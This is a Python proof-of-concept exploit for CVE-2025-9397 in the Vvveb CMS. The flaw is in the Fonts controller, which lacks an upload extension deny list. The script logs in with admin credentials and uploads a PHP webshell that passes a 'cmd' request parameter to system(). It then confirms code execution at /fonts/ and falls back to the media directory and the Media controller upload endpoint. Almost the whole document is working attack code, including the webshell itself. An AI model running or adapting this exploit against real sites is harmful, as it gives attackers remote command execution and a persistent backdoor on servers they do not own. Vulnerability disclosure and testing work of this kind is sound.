#!/usr/bin/env python3
"""
CVE-2025-9397 - Vvveb CMS Unrestricted File Upload PoC

Vulnerability: The Fonts controller (/admin/controller/theme/fonts.php) uses 
the Media trait but does not define uploadDenyExtensions, allowing upload of 
arbitrary files including PHP files.
"""

import requests
import sys
import random
import string
import argparse


def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def login(session, base_url, username, password):
    login_url = f"{base_url}/admin/index.php?module=user/login"
    resp = session.get(login_url)
    
    data = {
        "user": username,
        "password": password
    }
    resp = session.post(login_url, data=data, allow_redirects=True)
    
    if "Dashboard" in resp.text or "Dasboard" in resp.text:
        return True
    
    dashboard_url = f"{base_url}/admin/index.php"
    resp = session.get(dashboard_url)
    if "Dashboard" in resp.text or "Dasboard" in resp.text:
        return True
    return False


def upload_webshell(session, base_url, filename, content):
    upload_url = f"{base_url}/admin/index.php?module=theme/fonts&action=upload"
    
    files = {
        'files[]': (filename, content, 'application/octet-stream')
    }
    data = {
        'mediaPath': '/'
    }
    
    resp = session.post(upload_url, files=files, data=data)
    return resp


def verify_webshell(session, base_url, filename):
    shell_url = f"{base_url}/fonts/{filename}"
    resp = session.get(shell_url, params={'cmd': 'id'})
    return resp


def main():
    parser = argparse.ArgumentParser(description="CVE-2025-9397 PoC")
    parser.add_argument("--target", "-t", default="http://localhost:8099", help="Target URL")
    parser.add_argument("--username", "-u", default="admin", help="Admin username")
    parser.add_argument("--password", "-p", default="admin123", help="Admin password")
    args = parser.parse_args()
    
    base_url = args.target.rstrip('/')
    
    print(f"[*] Target: {base_url}")
    print(f"[*] CVE-2025-9397 - Vvveb Unrestricted File Upload")
    print()
    
    session = requests.Session()
    
    print("[*] Step 1: Logging in as admin...")
    if not login(session, base_url, args.username, args.password):
        print("[-] Login failed!")
        return False
    print("[+] Login successful!")
    
    shell_name = f"shell_{random_string()}.php"
    shell_content = b'<?php if(isset($_GET["cmd"])){echo "CMD_OUTPUT_START:";system($_GET["cmd"]);echo ":CMD_OUTPUT_END";} ?>'
    
    print(f"[*] Step 2: Uploading PHP webshell: {shell_name}")
    resp = upload_webshell(session, base_url, shell_name, shell_content)
    
    print(f"[*] Upload response status: {resp.status_code}")
    print(f"[*] Upload response: {resp.text[:500]}")
    
    if resp.status_code == 200 and "success" in resp.text.lower():
        print("[+] Upload appears successful!")
    else:
        print("[!] Upload may have failed, checking anyway...")
    
    print(f"[*] Step 3: Verifying webshell execution at /fonts/{shell_name}")
    verify_resp = verify_webshell(session, base_url, shell_name)
    
    print(f"[*] Verification status: {verify_resp.status_code}")
    
    if "CMD_OUTPUT_START:" in verify_resp.text:
        output = verify_resp.text.split("CMD_OUTPUT_START:")[1].split(":CMD_OUTPUT_END")[0]
        print("[+] VULNERABILITY CONFIRMED!")
        print(f"[+] Command output: {output.strip()}")
        print(f"[+] Webshell URL: {base_url}/fonts/{shell_name}")
        return True
    elif verify_resp.status_code == 200 and "<?php" not in verify_resp.text:
        print("[+] File uploaded but PHP may not be executed in /fonts/ directory")
        print("[*] Checking media directory...")
        
        media_url = f"{base_url}/media/{shell_name}"
        media_resp = session.get(media_url, params={'cmd': 'id'})
        if "CMD_OUTPUT_START:" in media_resp.text:
            output = media_resp.text.split("CMD_OUTPUT_START:")[1].split(":CMD_OUTPUT_END")[0]
            print("[+] VULNERABILITY CONFIRMED!")
            print(f"[+] Command output: {output.strip()}")
            print(f"[+] Webshell URL: {media_url}")
            return True
        else:
            print("[-] Could not execute PHP in standard locations")
            print("[*] Attempting upload to Media controller instead...")
            
            upload_media_url = f"{base_url}/admin/index.php?module=media/media&action=upload"
            media_shell_name = f"shell_{random_string()}.php"
            files = {
                'files[]': (media_shell_name, shell_content, 'application/octet-stream')
            }
            data = {
                'mediaPath': '/'
            }
            resp = session.post(upload_media_url, files=files, data=data)
            print(f"[*] Media upload response: {resp.text[:300]}")
            
            media_shell_url = f"{base_url}/media/{media_shell_name}"
            verify_media = session.get(media_shell_url, params={'cmd': 'id'})
            if "CMD_OUTPUT_START:" in verify_media.text:
                output = verify_media.text.split("CMD_OUTPUT_START:")[1].split(":CMD_OUTPUT_END")[0]
                print("[+] VULNERABILITY CONFIRMED via Media controller!")
                print(f"[+] Command output: {output.strip()}")
                print(f"[+] Webshell URL: {media_shell_url}")
                return True
    
    print("[-] Could not confirm vulnerability exploitation")
    return False


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
